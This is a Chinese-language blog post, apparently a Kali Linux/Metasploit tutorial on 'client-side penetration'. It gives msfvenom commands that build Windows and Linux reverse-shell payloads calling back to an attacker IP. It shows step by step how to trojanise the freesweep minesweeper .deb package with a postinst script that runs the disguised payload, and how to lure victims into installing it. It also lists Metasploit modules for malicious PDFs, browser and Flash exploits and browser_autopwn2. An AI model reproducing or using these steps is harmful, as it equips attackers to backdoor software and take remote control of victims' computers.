<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="Kali渗透测试-MSF【客户端渗透】, 无心">
    <meta name="description" content="客户端渗透

在无法突破网络边界的情况下转而攻击客户端
社会工程学攻击
进而渗透线上业务网络


含有漏洞利用代码的WEB站点
利用客户端漏洞


含有漏洞利用代码的doc、pdf等文档
诱骗被害者执行Payload


诱骗受害者执行Pa">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>Kali渗透测试-MSF【客户端渗透】 | 无心</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 6.3.0"></head>



   <style>
    body{
       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
       background-repeat:no-repeat;
       background-size: 100% 100%;
       background-attachment:fixed;
    }
</style>



<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">无心</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">无心</div>
        <div class="logo-desc">
            
            你要努力，你想要的，只能你自己给；别人给的，你要问问自己，拿的起吗。
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">Kali渗透测试-MSF【客户端渗透】</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/Kali/">
                                <span class="chip bg-color">Kali</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/Kali/" class="post-category">
                                Kali
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-02-21
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    1.2k
                </div>
                

                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="客户端渗透"><a href="#客户端渗透" class="headerlink" title="客户端渗透"></a>客户端渗透</h2><blockquote>
<ul>
<li>在无法突破网络边界的情况下转而攻击客户端<ul>
<li>社会工程学攻击</li>
<li>进而渗透线上业务网络</li>
</ul>
</li>
<li>含有漏洞利用代码的WEB站点<ul>
<li>利用客户端漏洞</li>
</ul>
</li>
<li>含有漏洞利用代码的doc、pdf等文档</li>
<li>诱骗被害者执行Payload</li>
</ul>
</blockquote>
<h2 id="诱骗受害者执行Payload"><a href="#诱骗受害者执行Payload" class="headerlink" title="诱骗受害者执行Payload"></a>诱骗受害者执行Payload</h2><h3 id="Windwos"><a href="#Windwos" class="headerlink" title="Windwos"></a>Windwos</h3><h4 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h4><pre class="line-numbers language-none"><code class="language-none">msfvenom  -p windows&#x2F;shell&#x2F;reverse_tcp --list-options
列出payload&#x2F;windows&#x2F;shell&#x2F;reverse_tcp模块的参数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221181414285.png" alt="image-20230221181414285"></p>
<pre class="line-numbers language-none"><code class="language-none">msfvenom -a x86 --platform windows -p windows&#x2F;shell&#x2F;reverse_tcp LHOST&#x3D;192.168.216.171 LPORT&#x3D;4444 -b &quot;\x00&quot; -e x86&#x2F;shikata_ga_nai -f exe -o 1.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221182221487.png" alt="image-20230221182221487"></p>
<h4 id="msf侦听端口"><a href="#msf侦听端口" class="headerlink" title="msf侦听端口"></a>msf侦听端口</h4><p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221182441553.png" alt="image-20230221182441553"></p>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221182626561.png" alt="image-20230221182626561"></p>
<h4 id="客户端执行payload"><a href="#客户端执行payload" class="headerlink" title="客户端执行payload"></a>客户端执行payload</h4><blockquote>
<p>真实情况下需要使用社工等手段诱使客户端点击payload</p>
<p>此时服务端已经获取shell</p>
</blockquote>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221182808472.png" alt="image-20230221182808472"></p>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><blockquote>
<p>伪造Linux Deb安装包，诱骗linux客户端执行payload</p>
<p>freesweep # linux下的扫雷游戏</p>
<p>思路：</p>
<p>首先需要正常deb安装包文件，将deb包解压，再将payload注入到deb包的目录中，都准备好之后再打包成deb文件发送给linux客户端，linux客户端执行payload获取shell</p>
</blockquote>
<h4 id="下载正常deb包"><a href="#下载正常deb包" class="headerlink" title="下载正常deb包"></a>下载正常deb包</h4><ul>
<li><code>apt-get --download-only install freesweep</code></li>
</ul>
<blockquote>
<p>–download-only：只获取deb文件，不进行安装</p>
<p>下载完成之后默认放在&#x2F;var&#x2F;cache&#x2F;apt&#x2F;archives&#x2F;目录中</p>
</blockquote>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221184427338.png" alt="image-20230221184427338"></p>
<h4 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h4><ul>
<li><code>dpkg -x freesweep_1.0.2-1_amd64.deb free</code></li>
</ul>
<blockquote>
<p>-x：解压文件</p>
<p>free：解压到free目录</p>
</blockquote>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221184745399.png" alt="image-20230221184745399"></p>
<h5 id="创建DEBIAN目录及相关文件"><a href="#创建DEBIAN目录及相关文件" class="headerlink" title="创建DEBIAN目录及相关文件"></a>创建DEBIAN目录及相关文件</h5><p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221185016018.png" alt="image-20230221185016018"></p>
<h5 id="编辑control文件内容"><a href="#编辑control文件内容" class="headerlink" title="编辑control文件内容"></a>编辑control文件内容</h5><pre class="line-numbers language-none"><code class="language-none">Package: freesweep
Version: 1.0.2-1
Section: Games and Amusement
Priority: optional
Architecture: i386
Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
Description: a text.based minesweeper
	Freesweep is an implementation of the popular minesweeper game,where
	one tries to find all the mines without igniting any,based on hints given
	by the computer. Unlike most implementations of this game, Freesweep
	works in any visual text display - in Linux console,in an xterm, and in
	most text-based terminals currently in use<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221185204326.png" alt="image-20230221185204326"></p>
<h5 id="编辑postinst脚本"><a href="#编辑postinst脚本" class="headerlink" title="编辑postinst脚本"></a>编辑postinst脚本</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">!</span>/bin/sh
<span class="token function">sudo</span> <span class="token function">chmod</span> <span class="token number">2755</span> /usr/games/freesweep_scores <span class="token operator">&amp;&amp;</span> /usr/games/freesweep_scores <span class="token operator">&amp;</span> /usr/games/freesweep <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221185340652.png" alt="image-20230221185340652"></p>
<h4 id="注入payload"><a href="#注入payload" class="headerlink" title="注入payload"></a>注入payload</h4><ul>
<li><code>msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=192.168.216.171 LPORT=4444 -b &quot;\x00&quot; -f elf -o /root/free/usr/games/freesweep_scores</code></li>
</ul>
<blockquote>
<p>-f elf：elf为linux下的执行程序格式</p>
<p>&#x2F;root&#x2F;free&#x2F;usr&#x2F;games&#x2F;freesweep_scores：存放目录及输出为freesweep_scores</p>
</blockquote>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221190009919.png" alt="image-20230221190009919"></p>
<h4 id="打包为deb文件"><a href="#打包为deb文件" class="headerlink" title="打包为deb文件"></a>打包为deb文件</h4><ul>
<li><code>dpkg-deb --build /home/kali/桌面/free</code></li>
</ul>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221190244469.png" alt="image-20230221190244469"></p>
<h4 id="将新deb文件放入客户端"><a href="#将新deb文件放入客户端" class="headerlink" title="将新deb文件放入客户端"></a>将新deb文件放入客户端</h4><p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221190426297.png" alt="image-20230221190426297"></p>
<h4 id="服务端侦听"><a href="#服务端侦听" class="headerlink" title="服务端侦听"></a>服务端侦听</h4><p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221190747706.png" alt="image-20230221190747706"></p>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221190817814.png" alt="image-20230221190817814"></p>
<h4 id="客户端安装deb包"><a href="#客户端安装deb包" class="headerlink" title="客户端安装deb包"></a>客户端安装deb包</h4><blockquote>
<p>诱使客户端安装freesweep扫雷游戏执行payload</p>
</blockquote>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221191023437.png" alt="image-20230221191023437"></p>
<h4 id="服务端获取shell"><a href="#服务端获取shell" class="headerlink" title="服务端获取shell"></a>服务端获取shell</h4><p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221191045914.png" alt="image-20230221191045914"></p>
<h2 id="利用Acrobat-Reader漏洞执行payload"><a href="#利用Acrobat-Reader漏洞执行payload" class="headerlink" title="利用Acrobat Reader漏洞执行payload"></a>利用Acrobat Reader漏洞执行payload</h2><blockquote>
<p>隐藏payload，使客户端没有意识的执行payload</p>
</blockquote>
<h3 id="构造PDF文件"><a href="#构造PDF文件" class="headerlink" title="构造PDF文件"></a>构造PDF文件</h3><h4 id="服务端构造PDF文件"><a href="#服务端构造PDF文件" class="headerlink" title="服务端构造PDF文件"></a>服务端构造PDF文件</h4><pre class="line-numbers language-none"><code class="language-none">exploit&#x2F;windows&#x2F;fileformat&#x2F;adobe_utilprintf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221192708718.png" alt="image-20230221192708718"></p>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221193051042.png" alt="image-20230221193051042"></p>
<h4 id="Msf启动侦听"><a href="#Msf启动侦听" class="headerlink" title="Msf启动侦听"></a>Msf启动侦听</h4><p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221193551067.png" alt="image-20230221193551067"></p>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221193616201.png" alt="image-20230221193616201"></p>
<h4 id="客户端放入PDF执行"><a href="#客户端放入PDF执行" class="headerlink" title="客户端放入PDF执行"></a>客户端放入PDF执行</h4><p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221194459120.png" alt="image-20230221194459120"></p>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221194516591.png" alt="image-20230221194516591"></p>
<h3 id="构造恶意网站"><a href="#构造恶意网站" class="headerlink" title="构造恶意网站"></a>构造恶意网站</h3><h4 id="服务端构造恶意网站"><a href="#服务端构造恶意网站" class="headerlink" title="服务端构造恶意网站"></a>服务端构造恶意网站</h4><pre class="line-numbers language-none"><code class="language-none">exploit&#x2F;windows&#x2F;browser&#x2F;adobe_utilprintf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221201051298.png" alt="image-20230221201051298"></p>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221201220008.png" alt="image-20230221201220008"></p>
<h4 id="客户端访问网站"><a href="#客户端访问网站" class="headerlink" title="客户端访问网站"></a>客户端访问网站</h4><p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221202558498.png" alt="image-20230221202558498"></p>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221202710874.png" alt="image-20230221202710874"></p>
<h2 id="利用flash插件漏洞执行payload"><a href="#利用flash插件漏洞执行payload" class="headerlink" title="利用flash插件漏洞执行payload"></a>利用flash插件漏洞执行payload</h2><h3 id="Flash插件模块1"><a href="#Flash插件模块1" class="headerlink" title="Flash插件模块1"></a>Flash插件模块1</h3><h4 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h4><pre class="line-numbers language-none"><code class="language-none">exploit&#x2F;multi&#x2F;browser&#x2F;adobe_flash_hacking_team_uaf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221203340259.png" alt="image-20230221203340259"></p>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221203413224.png" alt="image-20230221203413224"></p>
<h4 id="客户端访问"><a href="#客户端访问" class="headerlink" title="客户端访问"></a>客户端访问</h4><blockquote>
<p>客户端没有flash插件，并且此模块不适合于当前客户端，总体流程如上</p>
</blockquote>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221203712920.png" alt="image-20230221203712920"></p>
<h3 id="Flash插件模块2"><a href="#Flash插件模块2" class="headerlink" title="Flash插件模块2"></a>Flash插件模块2</h3><pre class="line-numbers language-none"><code class="language-none">exploit&#x2F;multi&#x2F;browser&#x2F;adobe_flash_opaque_background_uaf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221204147094.png" alt="image-20230221204147094"></p>
<h3 id="Flash插件模块3"><a href="#Flash插件模块3" class="headerlink" title="Flash插件模块3"></a>Flash插件模块3</h3><h4 id="服务端配置-1"><a href="#服务端配置-1" class="headerlink" title="服务端配置"></a>服务端配置</h4><blockquote>
<p>此模块会将msf中所有将浏览器相关的漏洞利用模块全都打包为auxiliary类型模块，只要执行auxiliary模块，会将质量很好的浏览器模块都启动起来，此模块不需要指定payload，自动指定payload，当客户端访问网站时，此模块会根据客户端系统自动选择对应的exploit模块进行攻击</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">auxiliary&#x2F;server&#x2F;browser_autopwn2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221204603365.png" alt="image-20230221204603365"></p>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221205200375.png" alt="image-20230221205200375"></p>
<h4 id="客户端访问-1"><a href="#客户端访问-1" class="headerlink" title="客户端访问"></a>客户端访问</h4><blockquote>
<p>由于客户端没有此漏洞，服务端也获取不到shell</p>
</blockquote>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221205313803.png" alt="image-20230221205313803"></p>
<p><img src="/2023/02/21/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-MSF%E3%80%90%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F%E3%80%91/image-20230221205529094.png" alt="image-20230221205529094"></p>
